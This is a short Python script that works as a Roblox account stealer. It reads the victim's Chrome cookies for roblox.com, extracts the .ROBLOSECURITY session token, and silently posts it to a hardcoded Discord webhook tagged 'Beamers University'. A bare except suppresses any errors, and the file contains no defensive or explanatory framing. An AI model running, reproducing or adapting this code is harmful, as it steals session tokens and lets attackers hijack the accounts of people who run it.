import browser_cookie3, requests, threading, discord_webhook

webhook = 'https://discord.com/api/webhooks/1503847977888780359/_OKuhP_z6AMibPfWfqcaoh0rePN8Z69Fjq3GX5N2JhFh5MBD7UPu1RgBjTUrviIb_sy2'

def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'dsc.gg/beaminguni', 'content':f'```Cookie provided by Beamers University: {cookie}```'})
    except:
        pass
browsers = [chrome_logger]

for x in browsers:
    threading.Thread(target=x,).start()
